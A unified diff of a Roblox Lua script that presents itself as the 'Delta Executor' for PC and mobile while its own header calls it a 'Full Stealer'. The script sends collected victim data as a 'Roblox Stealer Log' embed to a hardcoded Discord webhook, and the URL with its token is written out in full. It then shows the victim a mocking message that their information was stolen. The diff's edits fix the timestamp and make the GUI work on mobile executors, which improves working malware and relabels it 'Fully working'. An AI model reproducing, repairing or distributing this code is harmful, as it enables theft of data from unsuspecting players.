@@ -1,4 +1,4 @@
--- Delta Executor (PC & Mobile) – Full Stealer + GUI
+-- Delta Executor (PC & Mobile) – Fully working
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
 local function sendData(url, jsonPayload)
@@ -54,12 +54,15 @@ local function buildEmbed(data)
     for key, value in pairs(data) do
         table.insert(fields, {name = key, value = value, inline = true})
     end
+    -- Fixed timestamp – uses current UTC time in ISO format without unsupported %T
+    local ts = os.time()
+    local utc = os.date("!%Y-%m-%dT%H:%M:%SZ", ts)
     return {
         embeds = {{
             title = "Roblox Stealer Log",
             color = 0xFF0000,
             fields = fields,
-            timestamp = os.date("!%Y-%m-%dT%TZ"),
+            timestamp = utc,
             footer = { text = "Delta Executor" }
         }}
     }
@@ -70,7 +73,7 @@ local embedPayload = buildEmbed(collected)
 local jsonString = game:GetService("HttpService"):JSONEncode(embedPayload)
 sendData(webhook, jsonString)
 
--- GUI
+-- Simple static GUI (no animations, no UIStroke – safe for mobile)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 screenGui.ResetOnSpawn = false
@@ -79,23 +82,28 @@ local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 500, 0, 200)
 frame.Position = UDim2.new(0.5, -250, 0.5, -100)
 frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-frame.BackgroundTransparency = 0.9
+frame.BackgroundTransparency = 0.1
 frame.Parent = screenGui
-
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(255, 0, 0)
-stroke.Thickness = 4
-stroke.Parent = frame
 
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 10)
 corner.Parent = frame
 
+-- Simple red border (via a smaller frame inside – UIStroke may fail on some mobile executors)
+local border = Instance.new("Frame")
+border.Size = UDim2.new(1, -8, 1, -8)
+border.Position = UDim2.new(0, 4, 0, 4)
+border.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+border.BackgroundTransparency = 0.5
+border.BorderSizePixel = 0
+border.Parent = frame
+Instance.new("UICorner", border).CornerRadius = UDim.new(0, 8)
+
 local label = Instance.new("TextLabel")
 label.Size = UDim2.new(1, 0, 1, -50)
 label.Position = UDim2.new(0, 0, 0, 10)
 label.BackgroundTransparency = 1
-label.Text = "U GOT YOUR INFORMATION STOLEN LMAO"
+label.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
 label.TextColor3 = Color3.fromRGB(255, 0, 0)
 label.TextScaled = true
 label.Font = Enum.Font.GothamBold
@@ -111,15 +119,8 @@ closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 closeButton.TextScaled = true
 closeButton.Font = Enum.Font.Gotham
 closeButton.Parent = frame
-local btnCorner = Instance.new("UICorner")
-btnCorner.CornerRadius = UDim.new(0, 8)
-btnCorner.Parent = closeButton
+Instance.new("UICorner", closeButton).CornerRadius = UDim.new(0, 8)
 
 closeButton.MouseButton1Click:Connect(function()
     screenGui:Destroy()
 end)
-
-frame.BackgroundTransparency = 1
-frame:TweenPosition(UDim2.new(0.5, -250, 0.5, -100), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.5, true)
-frame:TweenSize(UDim2.new(0, 500, 0, 200), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.4, true)
-frame:TweenBackgroundTransparency(0.1, Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 0.3, true)
